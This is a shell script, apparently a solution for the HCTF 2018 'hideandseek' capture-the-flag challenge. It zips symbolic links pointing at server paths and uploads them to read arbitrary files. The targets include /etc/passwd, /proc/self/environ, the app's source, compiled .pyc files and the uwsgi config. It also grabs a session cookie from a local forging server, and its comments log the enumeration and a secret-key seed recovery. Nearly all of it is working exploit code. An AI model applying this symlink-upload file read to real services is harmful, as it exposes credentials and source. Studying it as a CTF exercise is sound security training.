#!/bin/sh

function x(){
	zip -0 -y -q -r -o v2.zip cmdline zip zzz
	curl -v -s "http://hideandseek.2018.hctf.io/upload" \
	-H "Connection: close" \
	-F the_file=@v2.zip \
	--output -
	rm v2.zip
}

function xx(){
	rm -f _v
	ln -s $1 _v
	zip -0 -y -q -r -o b4.zip cmdline _v zip
	curl -s -vv "http://hideandseek.2018.hctf.io/upload" \
	-H "Connection: close" \
	-F the_file=@b4.zip \
	--output -
	rm b4.zip
}

function ff(){
	c=$(curl -s http://127.0.0.1:10008/fuck -I | grep -o -E 'session=(.*?);')
	res=$(curl -vv -s http://hideandseek.2018.hctf.io/ \
	-H "Cookie: $c" \
	--output -)
	echo $res
}

# ff 
# x
# xx /etc/passwd
# xx /start.sh
# xx ./uploads/x4.zip_/zip/fuck
# xx /app/hard_t0_guess_n9f5a95b5ku9fg/config.py

# xx /proc/self/environ
# xx /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
# xx /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html
# xx /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
# xx /proc/net/arp
# 02:42:a2:2a:1e:42
# 2485211766338
# xx /sys/class/net/eth0/address
# 
# import random;random.seed(2485211766338);print(str(random.random()*100))
# 
# 
# it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
# module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main
# callable=app
# logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log

# xx /app/hard_t0_guess_n9f5a95b5ku9fg/__pycache__/hard_t0_guess_also_df45v48ytj9_main.cpython-36.pyc
xx /app/hard_t0_guess_n9f5a95b5ku9fg/__pycache__/flag.cpython-36.pyc
# PWD=/app/hard_t0_guess_n9f5a95b5ku9fg

# xx /proc/self/cmdline
# xx /proc/11/status
# xx /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log
# 
# xx /proc/24/cmdline 
# xx /proc/10/cmdline
# xx /etc/uwsgi/uwsgi.ini